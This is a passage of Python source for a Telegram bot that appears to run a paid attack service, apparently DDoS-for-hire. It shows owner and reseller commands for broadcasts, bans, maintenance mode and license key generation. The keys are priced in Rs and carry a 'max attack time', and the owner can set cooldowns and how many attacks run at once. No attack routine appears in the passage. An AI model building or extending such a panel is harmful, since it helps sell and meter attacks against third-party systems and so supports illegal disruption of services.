    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓 𝑩𝒓𝒐𝒂𝒅𝒄𝒂𝒔𝒕 𝑺𝒆𝒏𝒕!</b>\n\n{HTML_EMOJI.DOCUMENT} 𝑻𝒐𝒕𝒂𝒍: {len(reseller_ids)}\n{HTML_EMOJI.CHECKMARK} 𝑫𝒆𝒍𝒊𝒗𝒆𝒓𝒆𝒅: {sent_count}\n{HTML_EMOJI.CROSS} 𝑭𝒂𝒊𝒍𝒆𝒅: {failed_count}", reply_to=message)

@bot.message_handler(commands=["broadcastpaid"])
def broadcast_paid_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /broadcastpaid &lt;message&gt;", reply_to=message)
        return
    
    broadcast_msg = command_parts[1]
    
    now = datetime.now()
    active_subscribers = list(users_collection.find({'key_expiry': {'$gt': now}}))
    
    if not active_subscribers:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐 𝒂𝒄𝒕𝒊𝒗𝒆 𝒔𝒖𝒃𝒔𝒄𝒓𝒊𝒃𝒆𝒓𝒔 𝒕𝒐 𝒔𝒆𝒏𝒅 𝒎𝒆𝒔𝒔𝒂𝒈𝒆 𝒕𝒐!", reply_to=message)
        return
        
    sent_count = 0
    fail_count = 0
    
    for user in active_subscribers:
        try:
            target_id = user['user_id']
            if is_owner(target_id):
                continue
            if bot:
                bot.send_message(target_id, f"{HTML_EMOJI.MONEY} <b>𝑷𝑨𝑰𝑫 𝑼𝑺𝑬𝑹 𝑨𝑵𝑵𝑶𝑼𝑵𝑪𝑬𝑴𝑬𝑵𝑻</b>\n\n{broadcast_msg}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
                sent_count += 1
                time.sleep(0.05)
        except Exception:
            fail_count += 1
    
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑩𝒓𝒐𝒂𝒅𝒄𝒂𝒔𝒕 𝑪𝒐𝒎𝒑𝒍𝒆𝒕𝒆!</b>\n\n{HTML_EMOJI.PROFILE} 𝑺𝒆𝒏𝒕 𝒕𝒐: {sent_count} 𝒑𝒂𝒊𝒅 𝒖𝒔𝒆𝒓𝒔\n{HTML_EMOJI.CROSS} 𝑭𝒂𝒊𝒍𝒆𝒅: {fail_count}", reply_to=message)

# ============ BAN COMMANDS ============

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /ban &lt;id or @username&gt;", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    if is_owner(target_user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒏𝒐𝒕 𝒃𝒂𝒏 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'user_id': target_user_id, 'username': resolved_name, 'banned': True, 'banned_at': datetime.now()}},
        upsert=True
    )
    
    try:
        if bot:
            bot.send_message(target_user_id, f"{HTML_EMOJI.BAN} <b>𝒀𝒐𝒖 𝒉𝒂𝒗𝒆 𝒃𝒆𝒆𝒏 𝒃𝒂𝒏𝒏𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑼𝒔𝒆𝒓 {display} 𝒃𝒂𝒏𝒏𝒆𝒅!</b>\n{HTML_EMOJI.PROFILE} 𝑰𝑫: {target_user_id}", reply_to=message)

@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /unban &lt;id or @username&gt;", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
    
    result = users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': False}}
    )
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    if result.modified_count > 0:
        try:
            if bot:
                bot.send_message(target_user_id, f"{HTML_EMOJI.CHECKMARK} <b>𝒀𝒐𝒖𝒓 𝒃𝒂𝒏 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒍𝒊𝒇𝒕𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        except:
            pass
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑼𝒔𝒆𝒓 {display} 𝒖𝒏𝒃𝒂𝒏𝒏𝒆𝒅!</b>\n{HTML_EMOJI.PROFILE} 𝑰𝑫: {target_user_id}", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅 𝒐𝒓 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝒖𝒏𝒃𝒂𝒏𝒏𝒆𝒅!</b>", reply_to=message)

@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /tban &lt;id or @username&gt; &lt;time&gt;\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /tban 123456 10m", reply_to=message)
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑼𝒔𝒆𝒓 𝒏𝒐𝒕 𝒇𝒐𝒖𝒏𝒅!</b>", reply_to=message)
        return
        
    if is_owner(target_user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑪𝒂𝒏𝒏𝒐𝒕 𝒃𝒂𝒏 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
        
    duration_str = command_parts[2]
    duration_td, label = parse_duration(duration_str)
    
    if not duration_td:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒅𝒖𝒓𝒂𝒕𝒊𝒐𝒏 𝒇𝒐𝒓𝒎𝒂𝒕!</b> 𝑼𝒔𝒆: 10m, 1h, 1d 𝒆𝒕𝒄.", reply_to=message)
        return
        
    ban_expiry = datetime.now() + duration_td
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}},
        upsert=True
    )
    
    safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝑼𝒔𝒆𝒓 {resolved_name or target_user_id} 𝒉𝒂𝒔 𝒃𝒆𝒆𝒏 𝒃𝒂𝒏𝒏𝒆𝒅 𝒇𝒐𝒓 {label}!</b>\n{HTML_EMOJI.TIMER} 𝑬𝒙𝒑𝒊𝒓𝒚: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}", reply_to=message)

# ============ GEN COMMAND ============

@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    reseller = get_reseller(user_id)
    
    if not is_owner(user_id) and not reseller:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒐𝒘𝒏𝒆𝒓/𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓!</b>", reply_to=message)
        return
    
    if reseller and reseller.get('blocked'):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.BAN} <b>𝒀𝒐𝒖𝒓 𝒑𝒂𝒏𝒆𝒍 𝒊𝒔 𝒃𝒍𝒐𝒄𝒌𝒆𝒅!</b>", reply_to=message)
        return
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"{HTML_EMOJI.STAR} 𝑽𝑰𝑷 𝑲𝑬𝒀", callback_data="keytype_vip"),
        InlineKeyboardButton(f"{HTML_EMOJI.DOCUMENT} 𝑵𝑶𝑹𝑴𝑨𝑳 𝑲𝑬𝒀", callback_data="keytype_normal")
    )
    
    bot.reply_to(message, f"{HTML_EMOJI.KEY} <b>𝑺𝑬𝑳𝑬𝑪𝑻 𝑲𝑬𝒀 𝑻𝒀𝑷𝑬</b>\n\n𝑪𝒉𝒐𝒐𝒔𝒆 𝒕𝒉𝒆 𝒕𝒚𝒑𝒆 𝒐𝒇 𝒌𝒆𝒚 𝒚𝒐𝒖 𝒘𝒂𝒏𝒕 𝒕𝒐 𝒈𝒆𝒏𝒆𝒓𝒂𝒕𝒆:", reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("keytype_"))
def key_type_callback(call):
    user_id = call.from_user.id
    
    if not is_owner(user_id) and not get_reseller(user_id):
        bot.answer_callback_query(call.id, f"{HTML_EMOJI.CROSS} 𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅!")
        return
    
    key_type = call.data.replace("keytype_", "").upper()
    
    temp_key_gen[user_id] = {'key_type': key_type}
    
    bot.edit_message_text(
        f"{HTML_EMOJI.CHECKMARK} 𝑺𝒆𝒍𝒆𝒄𝒕𝒆𝒅: <b>{key_type} 𝑲𝑬𝒀</b>\n\n"
        f"{HTML_EMOJI.DOCUMENT} 𝑵𝒐𝒘 𝒔𝒆𝒏𝒅 𝒕𝒉𝒆 𝒌𝒆𝒚 𝒅𝒆𝒕𝒂𝒊𝒍𝒔 𝒊𝒏 𝒕𝒉𝒊𝒔 𝒇𝒐𝒓𝒎𝒂𝒕:\n"
        f"<code>/gen &lt;prefix&gt; &lt;duration&gt; &lt;count&gt;</code>\n\n"
        f"𝑬𝒙𝒂𝒎𝒑𝒍𝒆: <code>/gen Dark 1d 5</code>\n\n"
        f"𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏 𝒇𝒐𝒓𝒎𝒂𝒕𝒔: 2h, 6h, 12h, 1d, 3d, 7d\n"
        f"𝑴𝒂𝒙 𝒄𝒐𝒖𝒏𝒕: 50 𝒇𝒐𝒓 𝒐𝒘𝒏𝒆𝒓, 20 𝒇𝒐𝒓 𝒓𝒆𝒔𝒆𝒍𝒍𝒆𝒓\n\n"
        f"𝑻𝒚𝒑𝒆 /cancel 𝒕𝒐 𝒂𝒃𝒐𝒓𝒕.",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="HTML"
    )
    bot.register_next_step_handler(call.message, process_key_gen)

def process_key_gen(message):
    user_id = message.from_user.id
    
    if message.text == "/cancel":
        if user_id in temp_key_gen:
            del temp_key_gen[user_id]
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑶𝒑𝒆𝒓𝒂𝒕𝒊𝒐𝒏 𝒄𝒂𝒏𝒄𝒆𝒍𝒍𝒆𝒅!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    if user_id not in temp_key_gen:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑷𝒍𝒆𝒂𝒔𝒆 𝒖𝒔𝒆 /gen 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒇𝒊𝒓𝒔𝒕!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    key_type = temp_key_gen[user_id]['key_type']
    del temp_key_gen[user_id]
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /gen &lt;prefix&gt; &lt;duration&gt; &lt;count&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /gen Dark 1d 5", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    prefix = command_parts[1].upper()
    duration_str = command_parts[2].lower()
    
    duration_key = None
    for d in ['2h', '6h', '12h', '1d', '3d', '7d']:
        if duration_str == d:
            duration_key = d
            break
    
    if not duration_key:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒇𝒐𝒓𝒎𝒂𝒕!</b> 𝑼𝒔𝒆: 2h, 6h, 12h, 1d, 3d, 7d", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    duration_seconds = DURATION_SECONDS[duration_key]
    duration_label = DURATION_LABELS[duration_key]
    
    try:
        count = int(command_parts[3])
        max_count = 50 if is_owner(user_id) else 20
        if count < 1 or count > max_count:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑪𝒐𝒖𝒏𝒕 𝒎𝒖𝒔𝒕 𝒃𝒆 𝒃𝒆𝒕𝒘𝒆𝒆𝒏 1-{max_count}!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒄𝒐𝒖𝒏𝒕!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    reseller = get_reseller(user_id)
    
    price_per_key = get_key_price(key_type, duration_key)
    max_attack_time = get_key_max_attack(key_type)
    total_price = price_per_key * count
    
    if is_owner(user_id):
        generated_keys = []
        for _ in range(count):
            key = generate_key(prefix, 12)
            key_doc = {
                'key': key,
                'duration_seconds': duration_seconds,
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_type': 'owner',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        
        if count == 1:
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>{key_type} 𝑲𝒆𝒚 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅!</b>\n\n{HTML_EMOJI.KEY} 𝑲𝒆𝒚: <code>{generated_keys[0]}</code>\n{HTML_EMOJI.TIMER} 𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {duration_label}\n{HTML_EMOJI.FIRE} 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌: {max_attack_time}s\n{HTML_EMOJI.CREDIT} 𝑷𝒓𝒊𝒄𝒆: {price_per_key} 𝑹𝒔", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>{count} {key_type} 𝑲𝒆𝒚𝒔 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅!</b>\n\n{HTML_EMOJI.KEY} 𝑲𝒆𝒚𝒔:\n{keys_text}\n\n{HTML_EMOJI.TIMER} 𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {duration_label}\n{HTML_EMOJI.FIRE} 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌: {max_attack_time}s\n{HTML_EMOJI.CREDIT} 𝑻𝒐𝒕𝒂𝒍 𝑷𝒓𝒊𝒄𝒆: {total_price} 𝑹𝒔", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    
    elif reseller:
        balance = reseller.get('balance', 0)
        
        if balance < total_price:
            bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒔𝒖𝒇𝒇𝒊𝒄𝒊𝒆𝒏𝒕 𝒃𝒂𝒍𝒂𝒏𝒄𝒆!</b>\n\n{HTML_EMOJI.CREDIT} 𝑹𝒆𝒒𝒖𝒊𝒓𝒆𝒅: {total_price} 𝑹𝒔 ({count} 𝒙 {price_per_key})\n{HTML_EMOJI.MONEY} 𝒀𝒐𝒖𝒓 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: {balance} 𝑹𝒔\n\n𝑨𝒅𝒅 𝒃𝒂𝒍𝒂𝒏𝒄𝒆 𝒇𝒓𝒐𝒎 𝒐𝒘𝒏𝒆𝒓!", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
            return
        
        username = message.from_user.username or str(user_id)
        generated_keys = []
        
        for _ in range(count):
            key = f"{username}-{generate_key(username, 8)}"
            key_doc = {
                'key': key,
                'duration_seconds': duration_seconds,
                'duration_label': duration_label,
                'created_at': datetime.now(),
                'created_by': user_id,
                'created_by_username': username,
                'created_by_type': 'reseller',
                'used': False,
                'used_by': None,
                'used_at': None,
                'max_users': 1,
                'key_type': key_type,
                'max_attack_time': max_attack_time
            }
            keys_collection.insert_one(key_doc)
            generated_keys.append(key)
        
        new_balance = balance - total_price
        resellers_collection.update_one(
            {'user_id': user_id},
            {'$set': {'balance': new_balance}, '$inc': {'total_keys_generated': count}}
        )
        
        try:
            keys_list_str = "\n".join([f"{k}" for k in generated_keys])
            owner_msg = (
                f"{HTML_EMOJI.BELL} <b>𝑹𝑬𝑺𝑬𝑳𝑳𝑬𝑹 𝑲𝑬𝒀 𝑮𝑬𝑵𝑬𝑹𝑨𝑻𝑰𝑶𝑵 𝑵𝑶𝑻𝑰𝑭𝑰𝑪𝑨𝑻𝑰𝑶𝑵</b>\n\n"
                f"{HTML_EMOJI.PROFILE} 𝑹𝒆𝒔𝒆𝒍𝒍𝒆𝒓: {username} ({user_id})\n"
                f"{HTML_EMOJI.KEY} 𝑲𝒆𝒚𝒔 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅: {count}\n"
                f"{HTML_EMOJI.STAR} 𝑲𝒆𝒚 𝑻𝒚𝒑𝒆: {key_type}\n"
                f"{HTML_EMOJI.TIMER} 𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {duration_label}\n"
                f"{HTML_EMOJI.CREDIT} 𝑷𝒓𝒊𝒄𝒆 𝒑𝒆𝒓 𝑲𝒆𝒚: {price_per_key} 𝑹𝒔\n"
                f"{HTML_EMOJI.CREDIT} 𝑻𝒐𝒕𝒂𝒍 𝑪𝒐𝒔𝒕: {total_price} 𝑹𝒔\n"
                f"{HTML_EMOJI.MONEY} 𝑹𝒆𝒎𝒂𝒊𝒏𝒊𝒏𝒈 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: {new_balance} 𝑹𝒔\n\n"
                f"{HTML_EMOJI.DOCUMENT} 𝑲𝒆𝒚𝒔:\n{keys_list_str}"
            )
            for owner in BOT_OWNER:
                if bot:
                    bot.send_message(owner, owner_msg, parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        except Exception as e:
            print(f"Failed to notify owner: {e}")
        
        if count == 1:
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>{key_type} 𝑲𝒆𝒚 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅!</b>\n\n{HTML_EMOJI.KEY} 𝑲𝒆𝒚: <code>{generated_keys[0]}</code>\n{HTML_EMOJI.TIMER} 𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {duration_label}\n{HTML_EMOJI.MONEY} 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: {new_balance} 𝑹𝒔\n{HTML_EMOJI.FIRE} 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌: {max_attack_time}s", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        else:
            keys_text = "\n".join([f"• <code>{k}</code>" for k in generated_keys])
            bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>{count} {key_type} 𝑲𝒆𝒚𝒔 𝑮𝒆𝒏𝒆𝒓𝒂𝒕𝒆𝒅!</b>\n\n{HTML_EMOJI.KEY} 𝑲𝒆𝒚𝒔:\n{keys_text}\n\n{HTML_EMOJI.TIMER} 𝑫𝒖𝒓𝒂𝒕𝒊𝒐𝒏: {duration_label}\n{HTML_EMOJI.CREDIT} 𝑪𝒐𝒔𝒕: {total_price} 𝑹𝒔\n{HTML_EMOJI.MONEY} 𝑩𝒂𝒍𝒂𝒏𝒄𝒆: {new_balance} 𝑹𝒔\n{HTML_EMOJI.FIRE} 𝑴𝒂𝒙 𝑨𝒕𝒕𝒂𝒄𝒌: {max_attack_time}s", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        current = get_user_cooldown_setting()
        safe_send_message(message.chat.id, f"{HTML_EMOJI.TIMER} <b>𝑪𝒖𝒓𝒓𝒆𝒏𝒕 𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏:</b> {current}s\n\n𝑪𝒉𝒂𝒏𝒈𝒆: /cooldown &lt;seconds&gt;", reply_to=message)
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 0:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒄𝒂𝒏𝒏𝒐𝒕 𝒃𝒆 𝒏𝒆𝒈𝒂𝒕𝒊𝒗𝒆!</b>", reply_to=message)
            return
        
        set_setting('user_cooldown', new_value)
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝑪𝒐𝒐𝒍𝒅𝒐𝒘𝒏 𝒔𝒆𝒕:</b> {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b>", reply_to=message)

@bot.message_handler(commands=["setmaxslot"])
def set_max_slot_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /setmaxslot &lt;slots&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /setmaxslot 4\n\n𝑻𝒉𝒊𝒔 𝒔𝒆𝒕𝒔 𝒉𝒐𝒘 𝒎𝒂𝒏𝒚 𝒂𝒕𝒕𝒂𝒄𝒌𝒔 𝒄𝒂𝒏 𝒓𝒖𝒏 𝒔𝒊𝒎𝒖𝒍𝒕𝒂𝒏𝒆𝒐𝒖𝒔𝒍𝒚.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return
    
    try:
        global current_max_slots
        new_slots = int(command_parts[1])
        
        if new_slots < 1:
            new_slots = 1
        if new_slots > 10:
            new_slots = 10
        
        current_max_slots = new_slots
        set_setting('max_concurrent_slots', new_slots)
        
        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝑴𝒂𝒙 𝒔𝒊𝒎𝒖𝒍𝒕𝒂𝒏𝒆𝒐𝒖𝒔 𝒂𝒕𝒕𝒂𝒄𝒌 𝒔𝒍𝒐𝒕𝒔 𝒔𝒆𝒕 𝒕𝒐: {new_slots}</b>\n\n𝑵𝒐𝒘 {new_slots} 𝒂𝒕𝒕𝒂𝒄𝒌𝒔 𝒄𝒂𝒏 𝒓𝒖𝒏 𝒂𝒕 𝒕𝒉𝒆 𝒔𝒂𝒎𝒆 𝒕𝒊𝒎𝒆.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝒏𝒖𝒎𝒃𝒆𝒓!</b> 𝑼𝒔𝒆: /setmaxslot &lt;slots&gt;", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)

# ============ MAINTENANCE COMMANDS ============

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.WARNING} 𝑼𝒔𝒂𝒈𝒆: /maintenance &lt;message&gt;\n\n𝑬𝒙𝒂𝒎𝒑𝒍𝒆: /maintenance 𝑩𝒐𝒕 𝒊𝒔 𝒖𝒑𝒅𝒂𝒕𝒊𝒏𝒈, 𝒑𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕 10 𝒎𝒊𝒏𝒖𝒕𝒆𝒔", reply_to=message)
        return
    
    msg = command_parts[1]
    set_maintenance(True, msg)
    safe_send_message(message.chat.id, f"{HTML_EMOJI.SETTINGS} <b>𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝑴𝒐𝒅𝒆 𝑶𝑵!</b>\n\n𝑴𝒆𝒔𝒔𝒂𝒈𝒆: {msg}\n\n𝑼𝒔𝒆 /ok 𝒕𝒐 𝒕𝒖𝒓𝒏 𝒐𝒇𝒇", reply_to=message)

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝑻𝒉𝒊𝒔 𝒄𝒐𝒎𝒎𝒂𝒏𝒅 𝒄𝒂𝒏 𝒐𝒏𝒍𝒚 𝒃𝒆 𝒖𝒔𝒆𝒅 𝒃𝒚 𝒕𝒉𝒆 𝒐𝒘𝒏𝒆𝒓!</b>", reply_to=message)
        return
    
    if not is_maintenance():
        safe_send_message(message.chat.id, f"{HTML_EMOJI.INFO} <b>𝑴𝒂𝒊𝒏𝒕𝒆𝒏𝒂𝒏𝒄𝒆 𝒎𝒐𝒅𝒆 𝒊𝒔 𝒂𝒍𝒓𝒆𝒂𝒅𝒚 𝑶𝑭𝑭!</b>", reply_to=message)
